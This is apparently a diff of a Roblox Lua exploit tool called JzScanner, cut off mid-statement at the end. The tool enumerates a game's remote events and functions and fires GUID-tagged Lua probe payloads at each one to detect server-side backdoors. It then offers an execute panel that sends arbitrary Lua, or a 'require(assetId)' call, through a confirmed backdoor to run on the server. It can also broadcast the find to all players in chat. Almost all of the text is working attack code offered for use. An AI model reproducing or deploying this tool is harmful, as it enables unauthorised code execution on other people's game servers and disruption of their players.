+	local refs = { nil }
+	for _, r in ipairs(State.results) do
+		local ok, full = pcall(function()
+			return r.remote:GetFullName()
+		end)
+		if ok and full then
+			table.insert(paths, "game." .. full)
+			table.insert(refs, r.remote)
+		end
+	end
+	State.targetPaths = paths
+	State.targetRefs = refs
+	if State.targetIndex > #paths then
+		State.targetIndex = 1
+	end
+	if UI.updateTargetLabel then
+		UI.updateTargetLabel()
+	end
+end
+
+local function renderResults()
+	for _, c in ipairs(UI.ResultsFrame:GetChildren()) do
+		if c:IsA("Frame") then
+			c:Destroy()
+		end
+	end
+	for i, r in ipairs(State.results) do
+		local row = create("Frame", {
+			Size = UDim2.new(1, -8, 0, 46),
+			BackgroundColor3 = THEME.panel,
+			BackgroundTransparency = 0.1,
+			BorderSizePixel = 0,
+			LayoutOrder = i,
+			Parent = UI.ResultsFrame,
+		})
+		corner(row, 8)
+		local badgeColor = r.confirmed and THEME.good or (r.score >= 3 and THEME.warn or THEME.dim)
+		local badge = create("TextLabel", {
+			Size = UDim2.new(0, 58, 1, -10),
+			Position = UDim2.new(0, 5, 0, 5),
+			BackgroundColor3 = badgeColor,
+			BackgroundTransparency = 0.15,
+			Text = r.confirmed and "HIT!" or (tostring(r.score)),
+			TextColor3 = Color3.fromRGB(10, 10, 14),
+			TextSize = r.confirmed and 14 or 16,
+			Font = Enum.Font.GothamBold,
+			BorderSizePixel = 0,
+			Parent = row,
+		})
+		corner(badge, 6)
+		create("TextLabel", {
+			Size = UDim2.new(1, -210, 0, 20),
+			Position = UDim2.new(0, 70, 0, 4),
+			BackgroundTransparency = 1,
+			Text = r.remote.Name .. "  (" .. r.remote.ClassName .. ")",
+			TextColor3 = THEME.text,
+			TextSize = 13,
+			Font = Enum.Font.GothamBold,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			TextTruncate = Enum.TextTruncate.AtEnd,
+			Parent = row,
+		})
+		create("TextLabel", {
+			Size = UDim2.new(1, -210, 0, 16),
+			Position = UDim2.new(0, 70, 0, 24),
+			BackgroundTransparency = 1,
+			Text = r.reason ~= "" and r.reason or r.pathShort,
+			TextColor3 = THEME.dim,
+			TextSize = 10,
+			Font = Enum.Font.Code,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			TextTruncate = Enum.TextTruncate.AtEnd,
+			Parent = row,
+		})
+		local execB = create("TextButton", {
+			Size = UDim2.new(0, 56, 0, 28),
+			Position = UDim2.new(1, -130, 0.5, -14),
+			BackgroundColor3 = THEME.good,
+			Text = "EXEC",
+			TextColor3 = Color3.fromRGB(10, 12, 10),
+			TextSize = 12,
+			Font = Enum.Font.GothamBold,
+			BorderSizePixel = 0,
+			AutoButtonColor = false,
+			Parent = row,
+		})
+		corner(execB, 6)
+		hoverify(execB, THEME.good, Color3.fromRGB(40, 140, 75))
+		local copyB = create("TextButton", {
+			Size = UDim2.new(0, 56, 0, 28),
+			Position = UDim2.new(1, -66, 0.5, -14),
+			BackgroundColor3 = THEME.btn,
+			Text = "PATH",
+			TextColor3 = THEME.text,
+			TextSize = 12,
+			Font = Enum.Font.GothamBold,
+			BorderSizePixel = 0,
+			AutoButtonColor = false,
+			Parent = row,
+		})
+		corner(copyB, 6)
+		hoverify(copyB, THEME.btn, THEME.btnHover)
+		execB.MouseButton1Click:Connect(function()
+			for idx, ref in ipairs(State.targetRefs) do
+				if ref == r.remote then
+					State.targetIndex = idx
+					break
+				end
+			end
+			if UI.updateTargetLabel then
+				UI.updateTargetLabel()
+			end
+			switchTab("exec")
+			outputLine("target → " .. r.remote.Name)
+		end)
+		copyB.MouseButton1Click:Connect(function()
+			if copyText("game." .. r.fullPath) then
+				toast("📋 Copied", r.fullPath, THEME.accent)
+			else
+				toast("⚠ Clipboard unavailable", r.fullPath, THEME.warn)
+			end
+		end)
+	end
+	if #State.results == 0 then
+		create("TextLabel", {
+			Size = UDim2.new(1, -8, 0, 40),
+			BackgroundTransparency = 1,
+			Text = "no results yet — run a scan",
+			TextColor3 = THEME.dim,
+			TextSize = 13,
+			Font = Enum.Font.Gotham,
+			LayoutOrder = 1,
+			Parent = UI.ResultsFrame,
+		})
+	end
+end
+UI.renderResults = renderResults
+
+local function renderLogs()
+	for _, c in ipairs(UI.LogsFrame:GetChildren()) do
+		if c:IsA("TextLabel") then
+			c:Destroy()
+		end
+	end
+	local n = #State.logs
+	local from = math.max(1, n - 149)
+	for i = from, n do
+		local e = State.logs[i]
+		create("TextLabel", {
+			Size = UDim2.new(1, -8, 0, 20),
+			BackgroundTransparency = 1,
+			Text = ("[%s] %s %s"):format(e.stamp, LOG_ICONS[e.level], e.msg),
+			TextColor3 = LOG_COLORS[e.level],
+			TextSize = 11,
+			Font = Enum.Font.Code,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			TextTruncate = Enum.TextTruncate.AtEnd,
+			LayoutOrder = i,
+			Parent = UI.LogsFrame,
+		})
+	end
+end
+UI.renderLogs = renderLogs
+
+local ScanPage = pages.scan
+
+UI.ScanBtn = create("TextButton", {
+	Size = UDim2.new(0, 250, 0, 52),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundColor3 = THEME.accent,
+	Text = "🔍 START SCAN",
+	TextColor3 = Color3.fromRGB(8, 10, 12),
+	TextSize = 17,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = ScanPage,
+})
+corner(UI.ScanBtn, 10)
+hoverify(UI.ScanBtn, THEME.accent, Color3.fromRGB(0, 190, 172))
+
+UI.SensBtn = create("TextButton", {
+	Size = UDim2.new(0, 266, 0, 52),
+	Position = UDim2.new(0, 262, 0, 0),
+	BackgroundColor3 = THEME.panel2,
+	Text = "SENSITIVITY: MEDIUM",
+	TextColor3 = THEME.text,
+	TextSize = 13,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = ScanPage,
+})
+corner(UI.SensBtn, 10)
+hoverify(UI.SensBtn, THEME.panel2, THEME.btnHover)
+
+create("Frame", {
+	Size = UDim2.new(1, 0, 0, 10),
+	Position = UDim2.new(0, 0, 0, 66),
+	BackgroundColor3 = THEME.panel2,
+	BorderSizePixel = 0,
+	Parent = ScanPage,
+}).Name = "ProgressBG"
+
+UI.ProgressFill = create("Frame", {
+	Size = UDim2.new(0, 0, 1, 0),
+	BackgroundColor3 = THEME.accent,
+	BorderSizePixel = 0,
+	Parent = ScanPage:FindFirstChild("ProgressBG"),
+})
+corner(ScanPage:FindFirstChild("ProgressBG"), 5)
+corner(UI.ProgressFill, 5)
+
+UI.ScanStatus = create("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 18),
+	Position = UDim2.new(0, 0, 0, 82),
+	BackgroundTransparency = 1,
+	Text = "idle",
+	TextColor3 = THEME.dim,
+	TextSize = 12,
+	Font = Enum.Font.Gotham,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = ScanPage,
+})
+
+UI.StatsLbl = create("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 18),
+	Position = UDim2.new(0, 0, 0, 102),
+	BackgroundTransparency = 1,
+	Text = "",
+	TextColor3 = THEME.accent2,
+	TextSize = 11,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = ScanPage,
+})
+
+UI.ResultsFrame = create("ScrollingFrame", {
+	Size = UDim2.new(1, 0, 1, -128),
+	Position = UDim2.new(0, 0, 0, 128),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ScrollBarThickness = 6,
+	CanvasSize = UDim2.new(0, 0, 0, 0),
+	AutomaticCanvasSize = Enum.AutomaticSize.Y,
+	Parent = ScanPage,
+})
+create("UIListLayout", {
+	Padding = UDim.new(0, 6),
+	SortOrder = Enum.SortOrder.LayoutOrder,
+	Parent = UI.ResultsFrame,
+})
+
+local ExecPage = pages.exec
+
+UI.TargetBtn = create("TextButton", {
+	Size = UDim2.new(1, 0, 0, 34),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundColor3 = THEME.panel2,
+	Text = "🎯 TARGET: LOCAL",
+	TextColor3 = THEME.text,
+	TextSize = 13,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	TextTruncate = Enum.TextTruncate.AtEnd,
+	Parent = ExecPage,
+})
+corner(UI.TargetBtn, 8)
+hoverify(UI.TargetBtn, THEME.panel2, THEME.btnHover)
+
+UI.ModeBtn = create("TextButton", {
+	Size = UDim2.new(0, 180, 0, 30),
+	Position = UDim2.new(0, 0, 0, 42),
+	BackgroundColor3 = THEME.accent2,
+	Text = "MODE: LUA",
+	TextColor3 = Color3.fromRGB(14, 8, 20),
+	TextSize = 13,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = ExecPage,
+})
+corner(UI.ModeBtn, 8)
+hoverify(UI.ModeBtn, THEME.accent2, Color3.fromRGB(130, 60, 205))
+
+UI.ModeHint = create("TextLabel", {
+	Size = UDim2.new(1, -190, 0, 30),
+	Position = UDim2.new(0, 190, 0, 42),
+	BackgroundTransparency = 1,
+	Text = "LUA = raw server-side lua | REQUIRE = require(asset)(args)",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.Gotham,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextWrapped = true,
+	Parent = ExecPage,
+})
+
+UI.CodeBox = create("TextBox", {
+	Size = UDim2.new(1, 0, 0, 112),
+	Position = UDim2.new(0, 0, 0, 80),
+	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
+	BackgroundTransparency = 0.1,
+	Text = 'print("hello from jzscanner")',
+	PlaceholderText = "-- paste raw lua here...",
+	PlaceholderColor3 = THEME.dim,
+	TextColor3 = THEME.text,
+	TextSize = 13,
+	Font = Enum.Font.Code,
+	MultiLine = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Top,
+	ClearTextOnFocus = false,
+	BorderSizePixel = 0,
+	Parent = ExecPage,
+})
+corner(UI.CodeBox, 8)
+stroke(UI.CodeBox, THEME.stroke, 1, 0.4)
+
+UI.RequireGroup = create("Frame", {
+	Size = UDim2.new(1, 0, 0, 112),
+	Position = UDim2.new(0, 0, 0, 80),
+	BackgroundTransparency = 1,
+	Visible = false,
+	Parent = ExecPage,
+})
+
+create("TextLabel", {
+	Size = UDim2.new(0.5, -6, 0, 16),
+	Position = UDim2.new(0, 0, 0, 0),
+	BackgroundTransparency = 1,
+	Text = "ASSET ID:",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.GothamBold,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = UI.RequireGroup,
+})
+
+UI.RequireIdBox = create("TextBox", {
+	Size = UDim2.new(0.5, -6, 0, 34),
+	Position = UDim2.new(0, 0, 0, 18),
+	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
+	BackgroundTransparency = 0.1,
+	Text = "",
+	PlaceholderText = "6338277134",
+	PlaceholderColor3 = THEME.dim,
+	TextColor3 = THEME.text,
+	TextSize = 13,
+	Font = Enum.Font.Code,
+	ClearTextOnFocus = false,
+	BorderSizePixel = 0,
+	Parent = UI.RequireGroup,
+})
+corner(UI.RequireIdBox, 8)
+stroke(UI.RequireIdBox, THEME.stroke, 1, 0.4)
+
+create("TextLabel", {
+	Size = UDim2.new(0.5, 0, 0, 16),
+	Position = UDim2.new(0.5, 6, 0, 0),
+	BackgroundTransparency = 1,
+	Text = 'ARGS (default: your name):',
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.GothamBold,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	Parent = UI.RequireGroup,
+})
+
+UI.RequireArgsBox = create("TextBox", {
+	Size = UDim2.new(0.5, -6, 0, 34),
+	Position = UDim2.new(0.5, 6, 0, 18),
+	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
+	BackgroundTransparency = 0.1,
+	Text = "",
+	PlaceholderText = '"' .. PlayerName .. '"',
+	PlaceholderColor3 = THEME.dim,
+	TextColor3 = THEME.text,
+	TextSize = 13,
+	Font = Enum.Font.Code,
+	ClearTextOnFocus = false,
+	BorderSizePixel = 0,
+	Parent = UI.RequireGroup,
+})
+corner(UI.RequireArgsBox, 8)
+stroke(UI.RequireArgsBox, THEME.stroke, 1, 0.4)
+
+UI.RequirePreview = create("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 50),
+	Position = UDim2.new(0, 0, 0, 60),
+	BackgroundTransparency = 1,
+	Text = 'preview: require(ID)("NAME")',
+	TextColor3 = THEME.accent,
+	TextSize = 12,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextWrapped = true,
+	Parent = UI.RequireGroup,
+})
+
+UI.ExecBtn = create("TextButton", {
+	Size = UDim2.new(1, 0, 0, 42),
+	Position = UDim2.new(0, 0, 0, 200),
+	BackgroundColor3 = THEME.good,
+	Text = "💥 EXECUTE",
+	TextColor3 = Color3.fromRGB(8, 14, 10),
+	TextSize = 16,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = ExecPage,
+})
+corner(UI.ExecBtn, 10)
+hoverify(UI.ExecBtn, THEME.good, Color3.fromRGB(45, 165, 90))
+
+UI.OutLabel = create("TextLabel", {
+	Size = UDim2.new(1, 0, 1, -250),
+	Position = UDim2.new(0, 0, 0, 250),
+	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
+	BackgroundTransparency = 0.2,
+	Text = "> ready",
+	TextColor3 = THEME.good,
+	TextSize = 11,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Top,
+	TextWrapped = true,
+	BorderSizePixel = 0,
+	Parent = ExecPage,
+})
+corner(UI.OutLabel, 8)
+UI.outLabel = UI.OutLabel
+
+local LogsPage = pages.logs
+
+UI.ClearLogsBtn = create("TextButton", {
+	Size = UDim2.new(0, 130, 0, 30),
+	Position = UDim2.new(1, -130, 0, 0),
+	BackgroundColor3 = THEME.btn,
+	Text = "🗑 CLEAR",
+	TextColor3 = THEME.text,
+	TextSize = 12,
+	Font = Enum.Font.GothamBold,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Parent = LogsPage,
+})
+corner(UI.ClearLogsBtn, 8)
+hoverify(UI.ClearLogsBtn, THEME.btn, THEME.btnHover)
+
+UI.LogsFrame = create("ScrollingFrame", {
+	Size = UDim2.new(1, 0, 1, -40),
+	Position = UDim2.new(0, 0, 0, 40),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ScrollBarThickness = 6,
+	CanvasSize = UDim2.new(0, 0, 0, 0),
+	AutomaticCanvasSize = Enum.AutomaticSize.Y,
+	Parent = LogsPage,
+})
+create("UIListLayout", {
+	Padding = UDim.new(0, 2),
+	SortOrder = Enum.SortOrder.LayoutOrder,
+	Parent = UI.LogsFrame,
+})
+
+local SettingsPage = pages.settings
+
+local function makeSettingRow(y, labelText, key)
+	create("TextLabel", {
+		Size = UDim2.new(1, -150, 0, 34),
+		Position = UDim2.new(0, 0, 0, y),
+		BackgroundTransparency = 1,
+		Text = labelText,
+		TextColor3 = THEME.text,
+		TextSize = 13,
+		Font = Enum.Font.Gotham,
+		TextXAlignment = Enum.TextXAlignment.Left,
+		Parent = SettingsPage,
+	})
+	local btn = create("TextButton", {
+		Size = UDim2.new(0, 110, 0, 34),
+		Position = UDim2.new(1, -110, 0, y),
+		BackgroundColor3 = THEME.good,
+		Text = "ON",
+		TextColor3 = Color3.fromRGB(8, 14, 10),
+		TextSize = 13,
+		Font = Enum.Font.GothamBold,
+		BorderSizePixel = 0,
+		AutoButtonColor = false,
+		Parent = SettingsPage,
+	})
+	corner(btn, 8)
+	hoverify(btn, THEME.good, Color3.fromRGB(45, 165, 90))
+	btn.MouseButton1Click:Connect(function()
+		State.settings[key] = not State.settings[key]
+		if State.settings[key] then
+			btn.BackgroundColor3 = THEME.good
+			btn.Text = "ON"
+			btn.TextColor3 = Color3.fromRGB(8, 14, 10)
+		else
+			btn.BackgroundColor3 = THEME.panel2
+			btn.Text = "OFF"
+			btn.TextColor3 = THEME.dim
+		end
+		log("INFO", "setting " .. key .. " = " .. tostring(State.settings[key]))
+	end)
+	return btn
+end
+
+makeSettingRow(0, "📢 AUTO HINT — announce to everyone when backdoor is confirmed", "autoHint")
+makeSettingRow(46, "✔ EXEC CONFIRM — verify server actually ran your code", "confirmExec")
+makeSettingRow(92, "🔊 SOUND FX — alert sounds on detection", "sound")
+makeSettingRow(138, "🚀 AUTO SCAN — scan automatically when loaded", "autoScan")
+
+create("TextLabel", {
+	Size = UDim2.new(1, 0, 0, 90),
+	Position = UDim2.new(0, 0, 1, -96),
+	BackgroundTransparency = 1,
+	Text = "JzScanner "
+		.. VERSION
+		.. "\nprobe engine v2 — guid-traced payload injection\nmulti-signal heuristics · attribute + instance dual-marker\ntextchat + legacy chat broadcast fallback",
+	TextColor3 = THEME.dim,
+	TextSize = 11,
+	Font = Enum.Font.Code,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextYAlignment = Enum.TextYAlignment.Bottom,
+	TextWrapped = true,
+	Parent = SettingsPage,
+})
+
+switchTab("scan")
+
+local function updateTargetLabel()
+	local p = State.targetPaths[State.targetIndex]
+	if #p > 52 then
+		p = "…" .. p:sub(-51)
+	end
+	UI.TargetBtn.Text = "🎯 TARGET: " .. p
+end
+UI.updateTargetLabel = updateTargetLabel
+
+local function cycleTarget()
+	State.targetIndex = State.targetIndex % #State.targetPaths + 1
+	updateTargetLabel()
+end
+
+local function cycleMode()
+	State.modeIndex = State.modeIndex % #State.modes + 1
+	local m = State.modes[State.modeIndex]
+	UI.ModeBtn.Text = "MODE: " .. m
+	UI.CodeBox.Visible = (m == "LUA")
+	UI.RequireGroup.Visible = (m == "REQUIRE")
+end
+
+local function cycleSensitivity()
+	State.sensitivityIndex = State.sensitivityIndex % #State.sensitivities + 1
+	UI.SensBtn.Text = "SENSITIVITY: " .. State.sensitivities[State.sensitivityIndex]
+end
+
+UI.TargetBtn.MouseButton1Click:Connect(cycleTarget)
+UI.ModeBtn.MouseButton1Click:Connect(cycleMode)
+UI.SensBtn.MouseButton1Click:Connect(cycleSensitivity)
+UI.ClearLogsBtn.MouseButton1Click:Connect(function()
+	State.logs = {}
+	renderLogs()
+	log("INFO", "logs cleared")
+end)
+
+UI.RequireIdBox:GetPropertyChangedSignal("Text"):Connect(function()
+	local id = UI.RequireIdBox.Text:match("%d+") or "ID"
+	local args = UI.RequireArgsBox.Text
+	if args == "" then
+		args = '"' .. PlayerName .. '"'
+	end
+	UI.RequirePreview.Text = ("preview: require(%s)(%s)"):format(id, args)
+end)
+
+local function runLocal(code)
+	local f = loadstring or load
+	if not f then
+		outputLine("❌ executor has no loadstring")
+		return
+	end
+	local fn, err = f(code)
+	if not fn then
+		outputLine("❌ compile error: " .. tostring(err))
+		log("BAD", "local compile failed")
+		return
+	end
+	local ok, res = pcall(fn)
+	if ok then
+		outputLine("✅ ran locally, returned: " .. tostring(res))
+		log("GOOD", "local execution ok")
+	else
+		outputLine("❌ runtime error: " .. tostring(res))
+		log("BAD", "local runtime error: " .. tostring(res))
+	end
+end
+
+local function watchExecMarker(g)
+	local conn
+	conn = workspace.AttributeChanged:Connect(function(attr)
+		if attr == "JZXE_" .. g then
+			conn:Disconnect()
+			outputLine("✅ SERVER EXECUTION CONFIRMED")
+			log("GOOD", "execution confirmed via attribute marker")
+			playSound()
+		end
+	end)
+	task.delay(CONFIG.ExecConfirmWindow, function()
+		if conn.Connected then
+			conn:Disconnect()
+			outputLine("⚠ no confirm in " .. CONFIG.ExecConfirmWindow .. "s (code may still have run)")
+			log("WARN", "execution unconfirmed")
+		end
+	end)
+end
+
+local function executeCurrent()
+	if State.executing then
+		outputLine("⏳ already executing...")
+		return
+	end
+	State.executing = true
+	task.delay(3, function()
+		State.executing = false
+	end)
+	local mode = State.modes[State.modeIndex]
+	local code
+	if mode == "REQUIRE" then
+		local id = UI.RequireIdBox.Text:match("%d+")
+		if not id then
+			outputLine("❌ invalid asset id")
+			return
+		end
+		local args = UI.RequireArgsBox.Text
+		if args == "" then
+			args = '"' .. PlayerName .. '"'
+		end
+		code = ("require(%s)(%s)"):format(id, args)
+	else
+		code = UI.CodeBox.Text
+		if code == "" then
+			outputLine("❌ empty code")
+			return
+		end
+	end
+	local confirmGuid
+	if State.settings.confirmExec then
+		confirmGuid = newGuid()
+		code = code .. '\nworkspace:SetAttribute("JZXE_' .. confirmGuid .. '",true)'
+	end
+	local ref = State.targetRefs[State.targetIndex]
+	if ref == nil then
+		runLocal(code)
+	else
+		outputLine("📤 sending " .. #code .. " bytes → " .. ref.Name)
+		task.spawn(function()
+			if confirmGuid then
+				watchExecMarker(confirmGuid)
+			end
+			if ref:IsA("RemoteEvent") then
+				local ok = pcall(ref.FireServer, ref, code)
+				outputLine(ok and "📨 fired RemoteEvent" or "❌ FireServer failed")
+			else
+				local ok, res = pcall(ref.InvokeServer, ref, code)
+				outputLine(ok and ("📨 invoked, returned: " .. tostring(res)) or ("❌ InvokeServer failed: " .. tostring(res)))
+			end
+			log("INFO", "sent payload to " .. ref.Name .. " (" .. mode .. ")")
+		end)
+	end
+end
+
+UI.ExecBtn.MouseButton1Click:Connect(executeCurrent)
+
+local function hintBroadcast(message)
+	task.spawn(function()
+		local sent = false
+		pcall(function()
+			local tcs = game:GetService("TextChatService")
+			local ch = tcs:FindFirstChild("TextChannels")
+			local general = ch and ch:FindFirstChild("RBXGeneral")
+			if general then
+				general:SendAsync(message)
+				sent = true
+			end
+		end)
+		if not sent then
+			pcall(function()
+				local rs = game:GetService("ReplicatedStorage")
+				local ev = rs:FindFirstChild("DefaultChatSystemChatEvents")
+				local say = ev and ev:FindFirstChild("SayMessageRequest")
+				if say then
+					say:FireServer(message, "All")
+					sent = true
+				end
+			end)
+		end
+		if sent then
+			log("GOOD", "📢 hint broadcast to all players")
+			toast("📢 HINT SENT", message, THEME.good)
+		else
+			log("WARN", "no chat channel available — hint shown locally only")
+			toast("💬 HINT (local)", message, THEME.warn)
+		end
+	end)
+end
+
+local function markFound(m)
+	if not m.reported then
+		m.reported = true
+		State.stats.confirmed = State.stats.confirmed + 1
+		setStats()
+		local ok, fullPath = pcall(function()
+			return m.remote:GetFullName()
+		end)
+		log("GOOD", "✅ BACKDOOR CONFIRMED → " .. tostring(fullPath))
+		bigBanner(
+			"🚨 BACKDOOR FOUND 🚨",
+			tostring(fullPath) .. "  [" .. m.remote.ClassName .. "]",
+			THEME.good
+		)
+		playSound()
+		if State.settings.autoHint and not State.hintSentThisScan then
+			State.hintSentThisScan = true
+			hintBroadcast(CONFIG.HintMessage)
+		end
+	end
+	m.hits = m.hits + 1
+end
+
+local function runScan()
+	if State.scanning then
+		return
+	end
+	State.scanning = true
+	State.hintSentThisScan = false
+	State.stats = { total = 0, probed = 0, confirmed = 0 }
+	State.results = {}
+	State.targetPaths = { "LOCAL" }
+	State.targetRefs = { nil }
+	State.targetIndex = 1
+	updateTargetLabel()
+	renderResults()
+	UI.ScanBtn.Text = "⛔ SCANNING..."
+	UI.ScanBtn.BackgroundColor3 = THEME.bad
+	setProgress(0, "enumerating remotes...")
+	log("INFO", "scan started (sensitivity: " .. State.sensitivities[State.sensitivityIndex] .. ")")
+
+	local t0 = os.clock()
+	local remotes = {}
+	local count = 0
+	for _, obj in ipairs(game:GetDescendants()) do
+		count = count + 1
+		if obj.ClassName == "RemoteEvent" or obj.ClassName == "RemoteFunction" then
+			table.insert(remotes, obj)
+		end
+		if count % CONFIG.EnumChunk == 0 then
+			setProgress(0.12 * math.min(1, count / 20000), "enumerating... " .. count .. " instances")
+			task.wait()
+		end
+		if #remotes >= CONFIG.MaxRemotes then
+			break
+		end
+	end
+	State.stats.total = #remotes
+	log("INFO", "found " .. #remotes .. " remotes")
+	setProgress(0.15, "probing 0/" .. #remotes)
+
+	local markers = {}
+	local confirmedList = {}
+	local order = {}
+
+	local instConn
+	instConn = workspace.DescendantAdded:Connect(function(child)
+		local g = child.Name:match("^JZX_(%x+)$")
+		if g and markers[g] then
+			markFound(markers[g])
+		end
+	end)
+	local attrConn
+	attrConn = workspace.AttributeChanged:Connect(function(attr)
+		local g = attr:match("^JZX_(%x+)$")
+		if g and markers[g] then
+			markFound(markers[g])
+		end
+	end)
+
+	local minScore = State.sensMinScore[State.sensitivityIndex]
+	local scored = {}
+	for _, r in ipairs(remotes) do
+		local s, why = scoreRemote(r)
+		if s >= minScore then
+			table.insert(scored, { remote = r, score = s, reason = why })
+		end
+	end
+	table.sort(scored, function(a, b)
+		return a.score > b.score
+	end)
+	log("INFO", "probing " .. #scored .. "/" .. #remotes .. " remotes after filtering")
+
+	local sweepDeadline = t0 + CONFIG.SweepMaxTime
+	for i, entry in ipairs(scored) do
+		if State.destroyed then
+			break
+		end
+		if os.clock() > sweepDeadline then
+			log("WARN", "sweep deadline reached")
+			break
+		end
+		local g = newGuid()
+		local m = {
+			remote = entry.remote,
+			score = entry.score,
+			reason = entry.reason,
+			guid = g,
+			hits = 0,
+			reported = false,
+		}
+		markers[g] = m
+		table.insert(order, m)
+		local payload = 'workspace:SetAttribute("JZX_'
+			.. g
+			.. '",true) Instance.new("StringValue",workspace).Name="JZX_'
+			.. g
+			.. '"'
+		task.spawn(function()
+			if entry.remote:IsA("RemoteEvent") then
+				pcall(entry.remote.FireServer, entry.remote, payload)
+			else
+				pcall(entry.remote.InvokeServer, entry.remote, payload)
+			end
+		end)
+		State.stats.probed = State.stats.probed + 1
+		if i % 5 == 0 or i == #scored then
+			setProgress(0.15 + 0.75 * (i / #scored), ("probing %d/%d — hits: %d"):format(i, #scored, State.stats.confirmed))
+			UI.StatsLbl.Text = ("total %d | filtered %d | probed %d | hits %d | %.1fs"):format(
+				#remotes,
+				#remotes - #scored,
+				i,
+				State.stats.confirmed,
+				os.clock() - t0
+			)
+			setStats()
+		end
+		if i % CONFIG.BatchSize == 0 then
+			task.wait(CONFIG.BatchPause)
+		else
+			task.wait(CONFIG.ProbeDelay)
+		end
+	end
+
+	setProgress(0.92, "waiting for markers...")
+	local grace = (State.stats.confirmed > 0) and CONFIG.ExtraWindow or CONFIG.ConfirmWindow
+	local graceEnd = os.clock() + grace
+	while os.clock() < graceEnd do
+		task.wait(0.1)
+	end
+	instConn:Disconnect()
+	attrConn:Disconnect()
+
+	for _, m in ipairs(order) do
+		local ok, fullPath = pcall(function()
+			return m.remote:GetFullName()
+		end)
+		m.fullPath = ok and fullPath or (m.remote.Name .. "?")
+		m.pathShort = m.fullPath
+		if #m.pathShort > 46 then
+			m.pathShort = "…" .. m.pathShort:sub(-45)
+		end
+	end
+
+	table.sort(order, function(a, b)
+		local ac = a.hits > 0
+		local bc = b.hits > 0
+		if ac ~= bc then
+			return ac
+		end
+		if a.hits ~= b.hits then
+			return a.hits > b.hits
+		end
+		return a.score > b.score
+	end)
+
+	State.results = order
+	for _, m in ipairs(order) do
+		if m.hits > 0 then
+			table.insert(confirmedList, m)
+		end
+	end
+	renderResults()
+	rebuildTargets()
+
+	local elapsed = os.clock() - t0
+	setProgress(1, ("done in %.1fs"):format(elapsed))
+	UI.StatsLbl.Text = ("finished: %d probed | %d confirmed | %.1fs"):format(
+		State.stats.probed,
+		State.stats.confirmed,
+		elapsed
+	)
+	setStats()
+
+	if #confirmedList > 0 then
+		setStatus(("DONE — %d usable backdoor(s)! check EXECUTE tab"):format(#confirmedList))
+		log("GOOD", "scan done: " .. #confirmedList .. " confirmed in " .. string.format("%.1fs", elapsed))
+	else
+		setStatus("done — no exploitable remotes found")
+		log("INFO", "scan done: nothing confirmed (" .. string.format("%.1fs", elapsed) .. ")")
+		toast("SCAN COMPLETE", "no confirmed backdoors — try HIGH sensitivity", THEME.dim)
+	end
+
+	UI.ScanBtn.Text = "🔄 SCAN AGAIN"
+	UI.ScanBtn.BackgroundColor3 = THEME.accent
+	State.scanning = false
+end
+
+UI.ScanBtn.MouseButton1Click:Connect(function()
+	task.spawn(runScan)
+end)
+
+MinBtn.MouseButton1Click:Connect(function()
+	State.minimized = not State.minimized
+	if State.minimized then
+		Content.Visible = false
+		TabRow.Visible = false
+		StatusBar.Visible = false
+		TweenService:Create(Root, TweenInfo.new(0.25, Enum.EasingStyle.Quart), { Size = UDim2.new(0, 560, 0, 38) }):Play()
+	else
+		TweenService:Create(Root, TweenInfo.new(0.25, Enum.EasingStyle.Quart), { Size = UDim2.new(0, 560, 0, 440) })
+			.Completed
+			:Wait()
+		Content.Visible = true
+		TabRow.Visible = true
+		StatusBar.Visible = true
+	end
 end)
 
 CloseBtn.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
+	State.destroyed = true
+	parentGui:Destroy()
+	log("INFO", "JzScanner closed")
 end)
 
--- Toggle GUI Insert key
-UserInputService = game:GetService("UserInputService")
-UserInputService.InputBegan:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.Insert then
-        if MainFrame.Visible then
-            MainFrame.Visible = false
-            ExecutorFrame.Visible = false
-        else
-            MainFrame.Visible = true
-        end
-    end
+UserInputService.InputBegan:Connect(function(input, processed)
+	if processed then
+		return
+	end
+	if input.KeyCode == Enum.KeyCode.Insert then
+		parentGui.Enabled = not parentGui.Enabled
+	end
 end)
 
-print("🚀 Secret Backdoor Scanner V3 loaded! Press INSERT to toggle.")
+updateTargetLabel()
+renderResults()
+renderLogs()
+outputLine("> jzscanner " .. VERSION .. " ready")
+log("INFO", "JzScanner " .. VERSION .. " loaded — INSERT toggles UI")
+
+pcall(function()
